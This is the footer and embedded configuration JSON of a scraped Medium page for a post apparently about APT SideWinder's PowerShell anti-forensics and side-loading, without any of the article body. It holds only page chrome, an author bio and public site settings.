class="m ag"><div class="ac ci"><div class="cp bi gi gj gk gl"><div class="ac cw sn"><div class="ac r kj"><div class="so m"><span class="m sp sq sr f e"><div class="ac r kj kk"><div class="pw-multi-vote-icon fr kl km kn ko"><span data-dd-action-name="Susi presentation tracker clap_footer"><a class="ah ai aj fo al am an ao ap aq ar as at au av" data-testid="footerClapButton" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fvote%2Fp%2F5bc1a7e7c84c&amp;operation=register&amp;redirect=https%3A%2F%2Fsebdraven.medium.com%2Fapt-sidewinder-tricks-powershell-anti-forensics-and-execution-side-loading-5bc1a7e7c84c&amp;user=Sebdraven&amp;userId=11d98531eebe&amp;source=---footer_actions--5bc1a7e7c84c---------------------clap_footer------------------" rel="noopener follow"><div><div class="bn" aria-hidden="false" role="tooltip"><div tabindex="-1" class="bf"><div class="kp aq kq kr ks kt ao ku kv kw ko" role="presentation"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" aria-label="clap"><path fill-rule="evenodd" d="M11.37.828 12 3.282l.63-2.454zM13.916 3.953l1.523-2.112-1.184-.39zM8.589 1.84l1.522 2.112-.337-2.501zM18.523 18.92c-.86.86-1.75 1.246-2.62 1.33a6 6 0 0 0 .407-.372c2.388-2.389 2.86-4.951 1.399-7.623l-.912-1.603-.79-1.672c-.26-.56-.194-.98.203-1.288a.7.7 0 0 1 .546-.132c.283.046.546.231.728.5l2.363 4.157c.976 1.624 1.141 4.237-1.324 6.702m-10.999-.438L3.37 14.328a.828.828 0 0 1 .585-1.408.83.83 0 0 1 .585.242l2.158 2.157a.365.365 0 0 0 .516-.516l-2.157-2.158-1.449-1.449a.826.826 0 0 1 1.167-1.17l3.438 3.44a.363.363 0 0 0 .516 0 .364.364 0 0 0 0-.516L5.293 9.513l-.97-.97a.826.826 0 0 1 0-1.166.84.84 0 0 1 1.167 0l.97.968 3.437 3.436a.36.36 0 0 0 .517 0 .366.366 0 0 0 0-.516L6.977 7.83a.82.82 0 0 1-.241-.584.82.82 0 0 1 .824-.826c.219 0 .43.087.584.242l5.787 5.787a.366.366 0 0 0 .587-.415l-1.117-2.363c-.26-.56-.194-.98.204-1.289a.7.7 0 0 1 .546-.132c.283.046.545.232.727.501l2.193 3.86c1.302 2.38.883 4.59-1.277 6.75-1.156 1.156-2.602 1.627-4.19 1.367-1.418-.236-2.866-1.033-4.079-2.246M10.75 5.971l2.12 2.12c-.41.502-.465 1.17-.128 1.89l.22.465-3.523-3.523a.8.8 0 0 1-.097-.368c0-.22.086-.428.241-.584a.847.847 0 0 1 1.167 0m7.355 1.705c-.31-.461-.746-.758-1.23-.837a1.44 1.44 0 0 0-1.11.275c-.312.24-.505.543-.59.881a1.74 1.74 0 0 0-.906-.465 1.47 1.47 0 0 0-.82.106l-2.182-2.182a1.56 1.56 0 0 0-2.2 0 1.54 1.54 0 0 0-.396.701 1.56 1.56 0 0 0-2.21-.01 1.55 1.55 0 0 0-.416.753c-.624-.624-1.649-.624-2.237-.037a1.557 1.557 0 0 0 0 2.2c-.239.1-.501.238-.715.453a1.56 1.56 0 0 0 0 2.2l.516.515a1.556 1.556 0 0 0-.753 2.615L7.01 19c1.32 1.319 2.909 2.189 4.475 2.449q.482.08.971.08c.85 0 1.653-.198 2.393-.579.231.033.46.054.686.054 1.266 0 2.457-.52 3.505-1.567 2.763-2.763 2.552-5.734 1.439-7.586z" clip-rule="evenodd"></path></svg></div></div></div></div></a></span></div><div class="pw-multi-vote-count m kx ky kz la lb lc ld"><p class="bg b ec ab eb"><span class="le">--</span></p></div></div></span><span class="m i h g ss st"><div class="ac r kj kk"><div class="pw-multi-vote-icon fr kl km kn ko"><span data-dd-action-name="Susi presentation tracker clap_footer"><a class="ah ai aj fo al am an ao ap aq ar as at au av" data-testid="footerClapButton" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fvote%2Fp%2F5bc1a7e7c84c&amp;operation=register&amp;redirect=https%3A%2F%2Fsebdraven.medium.com%2Fapt-sidewinder-tricks-powershell-anti-forensics-and-execution-side-loading-5bc1a7e7c84c&amp;user=Sebdraven&amp;userId=11d98531eebe&amp;source=---footer_actions--5bc1a7e7c84c---------------------clap_footer------------------" rel="noopener follow"><div><div class="bn" aria-hidden="false" role="tooltip"><div tabindex="-1" class="bf"><div class="kp aq kq kr ks kt ao ku kv kw ko" role="presentation"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" aria-label="clap"><path fill-rule="evenodd" d="M11.37.828 12 3.282l.63-2.454zM13.916 3.953l1.523-2.112-1.184-.39zM8.589 1.84l1.522 2.112-.337-2.501zM18.523 18.92c-.86.86-1.75 1.246-2.62 1.33a6 6 0 0 0 .407-.372c2.388-2.389 2.86-4.951 1.399-7.623l-.912-1.603-.79-1.672c-.26-.56-.194-.98.203-1.288a.7.7 0 0 1 .546-.132c.283.046.546.231.728.5l2.363 4.157c.976 1.624 1.141 4.237-1.324 6.702m-10.999-.438L3.37 14.328a.828.828 0 0 1 .585-1.408.83.83 0 0 1 .585.242l2.158 2.157a.365.365 0 0 0 .516-.516l-2.157-2.158-1.449-1.449a.826.826 0 0 1 1.167-1.17l3.438 3.44a.363.363 0 0 0 .516 0 .364.364 0 0 0 0-.516L5.293 9.513l-.97-.97a.826.826 0 0 1 0-1.166.84.84 0 0 1 1.167 0l.97.968 3.437 3.436a.36.36 0 0 0 .517 0 .366.366 0 0 0 0-.516L6.977 7.83a.82.82 0 0 1-.241-.584.82.82 0 0 1 .824-.826c.219 0 .43.087.584.242l5.787 5.787a.366.366 0 0 0 .587-.415l-1.117-2.363c-.26-.56-.194-.98.204-1.289a.7.7 0 0 1 .546-.132c.283.046.545.232.727.501l2.193 3.86c1.302 2.38.883 4.59-1.277 6.75-1.156 1.156-2.602 1.627-4.19 1.367-1.418-.236-2.866-1.033-4.079-2.246M10.75 5.971l2.12 2.12c-.41.502-.465 1.17-.128 1.89l.22.465-3.523-3.523a.8.8 0 0 1-.097-.368c0-.22.086-.428.241-.584a.847.847 0 0 1 1.167 0m7.355 1.705c-.31-.461-.746-.758-1.23-.837a1.44 1.44 0 0 0-1.11.275c-.312.24-.505.543-.59.881a1.74 1.74 0 0 0-.906-.465 1.47 1.47 0 0 0-.82.106l-2.182-2.182a1.56 1.56 0 0 0-2.2 0 1.54 1.54 0 0 0-.396.701 1.56 1.56 0 0 0-2.21-.01 1.55 1.55 0 0 0-.416.753c-.624-.624-1.649-.624-2.237-.037a1.557 1.557 0 0 0 0 2.2c-.239.1-.501.238-.715.453a1.56 1.56 0 0 0 0 2.2l.516.515a1.556 1.556 0 0 0-.753 2.615L7.01 19c1.32 1.319 2.909 2.189 4.475 2.449q.482.08.971.08c.85 0 1.653-.198 2.393-.579.231.033.46.054.686.054 1.266 0 2.457-.52 3.505-1.567 2.763-2.763 2.552-5.734 1.439-7.586z" clip-rule="evenodd"></path></svg></div></div></div></div></a></span></div><div class="pw-multi-vote-count m kx ky kz la lb lc ld"><p class="bg b ec ab eb"><span class="le">--</span></p></div></div></span></div><div class="az ac"><div><div class="bn" aria-hidden="false" role="tooltip"><div tabindex="-1" class="bf"><button class="aq kp lf lg ac r fs lh li" aria-label="responses"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="lj"><path d="M18.006 16.803c1.533-1.456 2.234-3.325 2.234-5.321C20.24 7.357 16.709 4 12.191 4S4 7.357 4 11.482c0 4.126 3.674 7.482 8.191 7.482.817 0 1.622-.111 2.393-.327.231.2.48.391.744.559 1.06.693 2.203 1.044 3.399 1.044.224-.008.4-.112.486-.287a.49.49 0 0 0-.042-.518c-.495-.67-.845-1.364-1.04-2.057a4 4 0 0 1-.125-.598zm-3.122 1.055-.067-.223-.315.096a8 8 0 0 1-2.311.338c-4.023 0-7.292-2.955-7.292-6.587 0-3.633 3.269-6.588 7.292-6.588 4.014 0 7.112 2.958 7.112 6.593 0 1.794-.608 3.469-2.027 4.72l-.195.168v.255c0 .056 0 .151.016.295.025.231.081.478.154.733.154.558.398 1.117.722 1.659a5.3 5.3 0 0 1-2.165-.845c-.276-.176-.714-.383-.941-.59z"></path></svg></button></div></div></div></div></div><div class="ac r"><div class="qy m cb"><div><div class="bn" aria-hidden="false" role="tooltip"><div tabindex="-1" class="bf"><span data-dd-action-name="Susi presentation tracker bookmark_footer"><a class="ah ai aj fo al am an ao ap aq ar as at au av" data-testid="footerBookmarkButton" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fbookmark%2Fp%2F5bc1a7e7c84c&amp;operation=register&amp;redirect=https%3A%2F%2Fsebdraven.medium.com%2Fapt-sidewinder-tricks-powershell-anti-forensics-and-execution-side-loading-5bc1a7e7c84c&amp;source=---footer_actions--5bc1a7e7c84c---------------------bookmark_footer------------------" rel="noopener follow"><svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" fill="none" viewBox="0 0 25 25" class="eb ll" aria-label="Add to list bookmark button"><path fill="currentColor" d="M18 2.5a.5.5 0 0 1 1 0V5h2.5a.5.5 0 0 1 0 1H19v2.5a.5.5 0 1 1-1 0V6h-2.5a.5.5 0 0 1 0-1H18zM7 7a1 1 0 0 1 1-1h3.5a.5.5 0 0 0 0-1H8a2 2 0 0 0-2 2v14a.5.5 0 0 0 .805.396L12.5 17l5.695 4.396A.5.5 0 0 0 19 21v-8.5a.5.5 0 0 0-1 0v7.485l-5.195-4.012a.5.5 0 0 0-.61 0L7 19.985z"></path></svg></a></span></div></div></div></div><div class="qy m cb"><div class="bn" aria-hidden="false" aria-describedby="postFooterSocialMenu" aria-labelledby="postFooterSocialMenu"><div><div class="bn" aria-hidden="false" role="tooltip"><div tabindex="-1" class="bf"><button aria-controls="postFooterSocialMenu" aria-expanded="false" aria-label="Share Post" data-testid="footerSocialShareButton" class="ah fs aj fo al am an lt ap aq ar fe lu lv li lw"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M15.218 4.931a.4.4 0 0 1-.118.132l.012.006a.45.45 0 0 1-.292.074.5.5 0 0 1-.3-.13l-2.02-2.02v7.07c0 .28-.23.5-.5.5s-.5-.22-.5-.5v-7.04l-2 2a.45.45 0 0 1-.57.04h-.02a.4.4 0 0 1-.16-.3.4.4 0 0 1 .1-.32l2.8-2.8a.5.5 0 0 1 .7 0l2.8 2.79a.42.42 0 0 1 .068.498m-.106.138.008.004v-.01zM16 7.063h1.5a2 2 0 0 1 2 2v10a2 2 0 0 1-2 2h-11c-1.1 0-2-.9-2-2v-10a2 2 0 0 1 2-2H8a.5.5 0 0 1 .35.15.5.5 0 0 1 .15.35.5.5 0 0 1-.15.35.5.5 0 0 1-.35.15H6.4c-.5 0-.9.4-.9.9v10.2a.9.9 0 0 0 .9.9h11.2c.5 0 .9-.4.9-.9v-10.2c0-.5-.4-.9-.9-.9H16a.5.5 0 0 1 0-1" clip-rule="evenodd"></path></svg></button></div></div></div></div></div></div></div></div></div></div></footer><div class="su m"><div class="ac ci"><div class="cp bi gi gj gk gl"><div class="ac in il ij sv sw"><div class="sx sy sz ta tb tc td te tf tg ac cw"><div class="i l"><a tabindex="0" rel="noopener follow" href="/?source=post_page---post_author_info--5bc1a7e7c84c---------------------------------------" data-discover="true"><div class="m fr"><img alt="Sebdraven" class="m fk by th ti de" src="https://miro.medium.com/v2/resize:fill:96:96/1*ycwwStTvoVxriAE2No5ipQ.jpeg" width="48" height="48" loading="lazy"/><div class="ga by m th ti gb o ak tj"></div></div></a></div><div class="k j e"><a tabindex="0" rel="noopener follow" href="/?source=post_page---post_author_info--5bc1a7e7c84c---------------------------------------" data-discover="true"><div class="m fr"><img alt="Sebdraven" class="m fk by tk tl de" src="https://miro.medium.com/v2/resize:fill:128:128/1*ycwwStTvoVxriAE2No5ipQ.jpeg" width="64" height="64" loading="lazy"/><div class="ga by m tk tl gb o ak tj"></div></div></a></div><div class="k j e tm cb"><div class="ac"></div></div></div><div class="ac cv cd"><div class="tn to tp qj qi m"><a class="ah ai aj al am an ao ap aq ar as at au av ac r" rel="noopener follow" href="/?source=post_page---post_author_info--5bc1a7e7c84c---------------------------------------" data-discover="true"><h2 class="pw-author-name bg tr ts tt tu tv tw tx oc ty tz og ua ub ok uc ud bl"><span class="gw tq">Written by <!-- -->Sebdraven</span></h2></a><div class="rr ac ip"><div class="m cb"><span class="pw-follower-count bg b bh ab eb"><a class="ah ai aj fo al am an ao ap aq ar as at iy" rel="noopener follow" href="/followers?source=post_page---post_author_info--5bc1a7e7c84c---------------------------------------" data-discover="true">541 followers</a></span></div><div class="bg b bh ab eb ac ue"><span class="uf m" aria-hidden="true"><span class="bg b bh ab eb">·</span></span><a class="ah ai aj fo al am an ao ap aq ar as at iy" rel="noopener follow" href="/following?source=post_page---post_author_info--5bc1a7e7c84c---------------------------------------" data-discover="true">20 following</a></div></div><div class="ug m"><p class="bg b bh ab bl"><span class="gw">Malwarist,Threat Huntist and pythonist / core dev of #yeti/ member of @ProjectHoneynet / co-organizer #BotConf / researcher</span></p></div></div></div><div class="i l"><div class="ac"></div></div></div></div></div></div><div class="uh m"><div class="ui bi s su"></div><div class="ac ci"><div class="cp bi gi gj gk gl"><div class="ac r cw"><h2 class="bg tr mo mq mr ms mu mv mw my mz na nc nd ne ng nh bl">No responses yet</h2><div class="ac uj"><div><div class="bn" aria-hidden="false" role="tooltip"><div tabindex="-1" class="bf"><a class="uk ul" href="https://policy.medium.com/medium-rules-30e5502c4eb4?source=post_page---post_responses--5bc1a7e7c84c---------------------------------------" rel="noopener follow" target="_blank"><svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" aria-label="Shield with a checkmark" viewBox="0 0 25 25"><path fill-rule="evenodd" d="M11.987 5.036a.754.754 0 0 1 .914-.01c.972.721 1.767 1.218 2.6 1.543.828.322 1.719.485 2.887.505a.755.755 0 0 1 .741.757c-.018 3.623-.43 6.256-1.449 8.21-1.034 1.984-2.662 3.209-4.966 4.083a.75.75 0 0 1-.537-.003c-2.243-.874-3.858-2.095-4.897-4.074-1.024-1.951-1.457-4.583-1.476-8.216a.755.755 0 0 1 .741-.757c1.195-.02 2.1-.182 2.923-.503.827-.322 1.6-.815 2.519-1.535m.468.903c-.897.69-1.717 1.21-2.623 1.564-.898.35-1.856.527-3.026.565.037 3.45.469 5.817 1.36 7.515.884 1.684 2.25 2.762 4.284 3.571 2.092-.81 3.465-1.89 4.344-3.575.886-1.698 1.299-4.065 1.334-7.512-1.149-.039-2.091-.217-2.99-.567-.906-.353-1.745-.873-2.683-1.561m-.009 9.155a2.672 2.672 0 1 0 0-5.344 2.672 2.672 0 0 0 0 5.344m0 1a3.672 3.672 0 1 0 0-7.344 3.672 3.672 0 0 0 0 7.344m-1.813-3.777.525-.526.916.917 1.623-1.625.526.526-2.149 2.152z" clip-rule="evenodd"></path></svg></a></div></div></div></div></div><div class="um un uo up uq m"></div></div></div></div><div class="ur us ut uu uv m bx"><div class="i l k"><div class="ui bi uw ux"></div><div class="ac ci"><div class="cp bi gi gj gk gl"><div class="uy ac kj ja"><div class="uz va m"><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="https://help.medium.com/hc/en-us?source=post_page-----5bc1a7e7c84c---------------------------------------" rel="noopener follow"><p class="bg b ec ab eb">Help</p></a></div><div class="uz va m"><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="https://status.medium.com/?source=post_page-----5bc1a7e7c84c---------------------------------------" rel="noopener follow"><p class="bg b ec ab eb">Status</p></a></div><div class="uz va m"><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="https://medium.com/about?autoplay=1&amp;source=post_page-----5bc1a7e7c84c---------------------------------------" rel="noopener follow"><p class="bg b ec ab eb">About</p></a></div><div class="uz va m"><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="https://medium.com/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----5bc1a7e7c84c---------------------------------------" rel="noopener follow"><p class="bg b ec ab eb">Careers</p></a></div><div class="uz va m"><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="mailto:pressinquiries@medium.com" rel="noopener follow"><p class="bg b ec ab eb">Press</p></a></div><div class="uz va m"><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="https://blog.medium.com/?source=post_page-----5bc1a7e7c84c---------------------------------------" rel="noopener follow"><p class="bg b ec ab eb">Blog</p></a></div><div class="uz va m"><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----5bc1a7e7c84c---------------------------------------" rel="noopener follow"><p class="bg b ec ab eb">Privacy</p></a></div><div class="uz va m"><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="https://policy.medium.com/medium-rules-30e5502c4eb4?source=post_page-----5bc1a7e7c84c---------------------------------------" rel="noopener follow"><p class="bg b ec ab eb">Rules</p></a></div><div class="uz va m"><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----5bc1a7e7c84c---------------------------------------" rel="noopener follow"><p class="bg b ec ab eb">Terms</p></a></div><div class="uz m"><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="https://speechify.com/medium?source=post_page-----5bc1a7e7c84c---------------------------------------" rel="noopener follow"><p class="bg b ec ab eb">Text to speech</p></a></div></div></div></div></div></div></div></div></div></div></div></div><script>window.__BUILD_ID__="main-20250918-222439-d7a1ba14cb"</script><script>window.__GRAPHQL_URI__ = "https://sebdraven.medium.com/_/graphql"</script><script>window.__PRELOADED_STATE__ = {"algolia":{"queries":{}},"cache":{"experimentGroupSet":true,"reason":"","group":"enabled","tags":["group-edgeCachePosts","post-5bc1a7e7c84c","user-11d98531eebe"],"serverVariantState":"44136fa355b3678a1146ad16f7e8649e94fb4fc21fe77e8310c060f61caaff8a","middlewareEnabled":true,"cacheStatus":"DYNAMIC","shouldUseCache":true,"vary":[],"pubFeaturingPostPageLabelEnabled":false,"shouldFollowPostQueryEnabled":false},"client":{"hydrated":false,"isUs":false,"isNativeMedium":false,"isSafariMobile":false,"isSafari":false,"isFirefox":false,"routingEntity":{"type":"USER","id":"11d98531eebe","explicit":true},"viewerIsBot":false},"debug":{"requestId":"35cd8a93-c157-4015-980f-b46f68680901","requestTag":"","hybridDevServices":[],"originalSpanCarrier":{"traceparent":"00-eda01947c7a8c3aaffba935434181608-fa24a6d88135a4f2-01"}},"multiVote":{"clapsPerPost":{}},"navigation":{"hideGoogleOneTap":false,"hasRenderedAlternateUserBanner":null,"currentLocation":"https:\u002F\u002Fsebdraven.medium.com\u002Fapt-sidewinder-tricks-powershell-anti-forensics-and-execution-side-loading-5bc1a7e7c84c","host":"sebdraven.medium.com","hostname":"sebdraven.medium.com","referrer":"","hasSetReferrer":false,"susiModal":{"step":null,"operation":"register"},"postRead":false,"partnerProgram":{"selectedCountryCode":null},"staticRouterContext":{"route":{"name":"ShowPostUnderUser"},"statusCode":200},"toastQueue":[],"currentToast":null,"queryString":"","currentHash":""},"config":{"nodeEnv":"production","version":"main-20250918-222439-d7a1ba14cb","target":"production","productName":"Medium","publicUrl":"https:\u002F\u002Fcdn-client.medium.com\u002Flite","authDomain":"medium.com","authGoogleClientId":"216296035834-k1k6qe060s2tp2a2jam4ljdcms00sttg.apps.googleusercontent.com","favicon":"production","iosAppId":"828256236","glyphUrl":"https:\u002F\u002Fglyph.medium.com","branchKey":"key_live_ofxXr2qTrrU9NqURK8ZwEhknBxiI6KBm","algolia":{"appId":"MQ57UUUQZ2","apiKeySearch":"394474ced050e3911ae2249ecc774921","indexPrefix":"medium_","host":"-dsn.algolia.net"},"recaptchaKey":"6Lfc37IUAAAAAKGGtC6rLS13R1Hrw_BqADfS1LRk","recaptcha3Key":"6Lf8R9wUAAAAABMI_85Wb8melS7Zj6ziuf99Yot5","recaptchaEnterpriseKeyId":"6Le-uGgpAAAAAPprRaokM8AKthQ9KNGdoxaGUvVp","datadog":{"applicationId":"6702d87d-a7e0-42fe-bbcb-95b469547ea0","clientToken":"pub853ea8d17ad6821d9f8f11861d23dfed","rumToken":"pubf9cc52896502b9413b68ba36fc0c7162","context":{"deployment":{"target":"production","tag":"main-20250918-222439-d7a1ba14cb","commit":"d7a1ba14cbdbce415626b36f2a6daf3ad922f692"}},"datacenter":"us"},"googleAdsCode":"AW-17106321204","googleAnalyticsCode":"G-7JY7T788PK","googlePay":{"apiVersion":"2","apiVersionMinor":"0","merchantId":"BCR2DN6TV7EMTGBM","merchantName":"Medium","instanceMerchantId":"13685562959212738550"},"applePay":{"version":3},"signInWallCustomDomainCollectionIds":["3a8144eabfe3","336d898217ee","61061eb0c96b","138adf9c44c","819cc2aaeee0"],"mediumMastodonDomainName":"me.dm","mediumOwnedAndOperatedCollectionIds":["8a9336e5bb4","b7e45b22fec3","193b68bd4fba","8d6b8a439e32","54c98c43354d","3f6ecf56618","d944778ce714","92d2092dc598","ae2a65f35510","1285ba81cada","544c7006046e","fc8964313712","40187e704f1c","88d9857e584e","7b6769f2748b","bcc38c8f6edf","cef6983b292","cb8577c9149e","444d13b52878","713d7dbc99b0","ef8e90590e66","191186aaafa0","55760f21cdc5","9dc80918cc93","bdc4052bbdba","8ccfed20cbb2"],"tierOneDomains":["medium.com","thebolditalic.com","arcdigital.media","towardsdatascience.com","uxdesign.cc","codeburst.io","psiloveyou.xyz","writingcooperative.com","entrepreneurshandbook.co","prototypr.io","betterhumans.coach.me","theascent.pub"],"topicsToFollow":["d61cf867d93f","8a146bc21b28","1eca0103fff3","4d562ee63426","aef1078a3ef5","e15e46793f8d","6158eb913466","55f1c20aba7a","3d18b94f6858","4861fee224fd","63c6f1f93ee","1d98b3a9a871","decb52b64abf","ae5d4995e225","830cded25262"],"topicToTagMappings":{"accessibility":"accessibility","addiction":"addiction","android-development":"android-development","art":"art","artificial-intelligence":"artificial-intelligence","astrology":"astrology","basic-income":"basic-income","beauty":"beauty","biotech":"biotech","blockchain":"blockchain","books":"books","business":"business","cannabis":"cannabis","cities":"cities","climate-change":"climate-change","comics":"comics","coronavirus":"coronavirus","creativity":"creativity","cryptocurrency":"cryptocurrency","culture":"culture","cybersecurity":"cybersecurity","data-science":"data-science","design":"design","digital-life":"digital-life","disability":"disability","economy":"economy","education":"education","equality":"equality","family":"family","feminism":"feminism","fiction":"fiction","film":"film","fitness":"fitness","food":"food","freelancing":"freelancing","future":"future","gadgets":"gadgets","gaming":"gaming","gun-control":"gun-control","health":"health","history":"history","humor":"humor","immigration":"immigration","ios-development":"ios-development","javascript":"javascript","justice":"justice","language":"language","leadership":"leadership","lgbtqia":"lgbtqia","lifestyle":"lifestyle","machine-learning":"machine-learning","makers":"makers","marketing":"marketing","math":"math","media":"media","mental-health":"mental-health","mindfulness":"mindfulness","money":"money","music":"music","neuroscience":"neuroscience","nonfiction":"nonfiction","outdoors":"outdoors","parenting":"parenting","pets":"pets","philosophy":"philosophy","photography":"photography","podcasts":"podcast","poetry":"poetry","politics":"politics","privacy":"privacy","product-management":"product-management","productivity":"productivity","programming":"programming","psychedelics":"psychedelics","psychology":"psychology","race":"race","relationships":"relationships","religion":"religion","remote-work":"remote-work","san-francisco":"san-francisco","science":"science","self":"self","self-driving-cars":"self-driving-cars","sexuality":"sexuality","social-media":"social-media","society":"society","software-engineering":"software-engineering","space":"space","spirituality":"spirituality","sports":"sports","startups":"startup","style":"style","technology":"technology","transportation":"transportation","travel":"travel","true-crime":"true-crime","tv":"tv","ux":"ux","venture-capital":"venture-capital","visual-design":"visual-design","work":"work","world":"world","writing":"writing"},"defaultImages":{"avatar":{"imageId":"1*dmbNkD5D-u45r44go_cf0g.png","height":150,"width":150},"orgLogo":{"imageId":"7*V1_7XP4snlmqrc_0Njontw.png","height":110,"width":500},"postLogo":{"imageId":"167cff2a3d17ac1e64d0762539978f2d54c0058886e8b3c8a03a725a83012ec0","height":630,"width":1200},"postPreviewImage":{"imageId":"bc1f8416df0cad099e43cda2872716e5864f18a73bda2a7547ea082aca9b5632","height":630,"width":1200}},"embeddedPostIds":{"coronavirus":"cd3010f9d81f"},"sharedCdcMessaging":{"COVID_APPLICABLE_TAG_SLUGS":[],"COVID_APPLICABLE_TOPIC_NAMES":[],"COVID_APPLICABLE_TOPIC_NAMES_FOR_TOPIC_PAGE":[],"COVID_MESSAGES":{"tierA":{"text":"For more information on the novel coronavirus and Covid-19, visit cdc.gov.","markups":[{"start":66,"end":73,"href":"https:\u002F\u002Fwww.cdc.gov\u002Fcoronavirus\u002F2019-nCoV"}]},"tierB":{"text":"Anyone can publish on Medium per our Policies, but we don’t fact-check every story. For more info about the coronavirus, see cdc.gov.","markups":[{"start":37,"end":45,"href":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Fcategories\u002F201931128-Policies-Safety"},{"start":125,"end":132,"href":"https:\u002F\u002Fwww.cdc.gov\u002Fcoronavirus\u002F2019-nCoV"}]},"paywall":{"text":"This article has been made free for everyone, thanks to Medium Members. For more information on the novel coronavirus and Covid-19, visit cdc.gov.","markups":[{"start":56,"end":70,"href":"https:\u002F\u002Fmedium.com\u002Fmembership"},{"start":138,"end":145,"href":"https:\u002F\u002Fwww.cdc.gov\u002Fcoronavirus\u002F2019-nCoV"}]},"unbound":{"text":"This article is free for everyone, thanks to Medium Members. For more information on the novel coronavirus and Covid-19, visit cdc.gov.","markups":[{"start":45,"end":59,"href":"https:\u002F\u002Fmedium.com\u002Fmembership"},{"start":127,"end":134,"href":"https:\u002F\u002Fwww.cdc.gov\u002Fcoronavirus\u002F2019-nCoV"}]}},"COVID_BANNER_POST_ID_OVERRIDE_WHITELIST":["3b31a67bff4a"]},"sharedVoteMessaging":{"TAGS":["politics","election-2020","government","us-politics","election","2020-presidential-race","trump","donald-trump","democrats","republicans","congress","republican-party","democratic-party","biden","joe-biden","maga"],"TOPICS":["politics","election"],"MESSAGE":{"text":"Find out more about the U.S. election results here.","markups":[{"start":46,"end":50,"href":"https:\u002F\u002Fcookpolitical.com\u002F2020-national-popular-vote-tracker"}]},"EXCLUDE_POSTS":["397ef29e3ca5"]},"embedPostRules":[],"recircOptions":{"v1":{"limit":3},"v2":{"limit":8}},"braintreeClientKey":"production_zjkj96jm_m56f8fqpf7ngnrd4","braintree":{"enabled":true,"merchantId":"m56f8fqpf7ngnrd4","merchantAccountId":{"usd":"AMediumCorporation_instant","eur":"amediumcorporation_EUR","cad":"amediumcorporation_CAD"},"publicKey":"ds2nn34bg2z7j5gd","braintreeEnvironment":"production","dashboardUrl":"https:\u002F\u002Fwww.braintreegateway.com\u002Fmerchants","gracePeriodDurationInDays":14,"mediumMembershipPlanId":{"monthly":"ce105f8c57a3","monthlyV2":"e8a5e126-792b-4ee6-8fba-d574c1b02fc5","monthlyWithTrial":"d5ee3dbe3db8","monthlyPremium":"fa741a9b47a2","yearly":"a40ad4a43185","yearlyV2":"3815d7d6-b8ca-4224-9b8c-182f9047866e","yearlyStaff":"d74fb811198a","yearlyWithTrial":"b3bc7350e5c7","yearlyPremium":"e21bd2c12166","monthlyOneYearFree":"e6c0637a-2bad-4171-ab4f-3c268633d83c","monthly25PercentOffFirstYear":"235ecc62-0cdb-49ae-9378-726cd21c504b","monthly20PercentOffFirstYear":"ba518864-9c13-4a99-91ca-411bf0cac756","monthly15PercentOffFirstYear":"594c029b-9f89-43d5-88f8-8173af4e070e","monthly10PercentOffFirstYear":"c6c7bc9a-40f2-4b51-8126-e28511d5bdb0","monthlyForStudents":"629ebe51-da7d-41fd-8293-34cd2f2030a8","yearlyOneYearFree":"78ba7be9-0d9f-4ece-aa3e-b54b826f2bf1","yearly25PercentOffFirstYear":"2dbb010d-bb8f-4eeb-ad5c-a08509f42d34","yearly20PercentOffFirstYear":"47565488-435b-47f8-bf93-40d5fbe0ebc8","yearly15PercentOffFirstYear":"8259809b-0881-47d9-acf7-6c001c7f720f","yearly10PercentOffFirstYear":"9dd694fb-96e1-472c-8d9e-3c868d5c1506","yearlyForStudents":"e29345ef-ab1c-4234-95c5-70e50fe6bc23","monthlyCad":"p52orjkaceei","yearlyCad":"h4q9g2up9ktt"},"braintreeDiscountId":{"oneMonthFree":"MONTHS_FREE_01","threeMonthsFree":"MONTHS_FREE_03","sixMonthsFree":"MONTHS_FREE_06","fiftyPercentOffOneYear":"FIFTY_PERCENT_OFF_ONE_YEAR"},"3DSecureVersion":"2","defaultCurrency":"usd","providerPlanIdCurrency":{"4ycw":"usd","rz3b":"usd","3kqm":"usd","jzw6":"usd","c2q2":"usd","nnsw":"usd","q8qw":"usd","d9y6":"usd","fx7w":"cad","nwf2":"cad"}},"paypalClientId":"AXj1G4fotC2GE8KzWX9mSxCH1wmPE3nJglf4Z2ig_amnhvlMVX87otaq58niAg9iuLktVNF_1WCMnN7v","paypal":{"host":"https:\u002F\u002Fapi.paypal.com:443","clientMode":"production","serverMode":"live","webhookId":"4G466076A0294510S","monthlyPlan":{"planId":"P-9WR0658853113943TMU5FDQA","name":"Medium Membership (Monthly) with setup fee","description":"Unlimited access to the best and brightest stories on Medium. Membership billed monthly."},"yearlyPlan":{"planId":"P-7N8963881P8875835MU5JOPQ","name":"Medium Membership (Annual) with setup fee","description":"Unlimited access to the best and brightest stories on Medium. Membership billed annually."},"oneYearGift":{"name":"Medium Membership (1 Year, Digital Gift Code)","description":"Unlimited access to the best and brightest stories on Medium. Gift codes can be redeemed at medium.com\u002Fredeem.","price":"50.00","currency":"USD","sku":"membership-gift-1-yr"},"oldMonthlyPlan":{"planId":"P-96U02458LM656772MJZUVH2Y","name":"Medium Membership 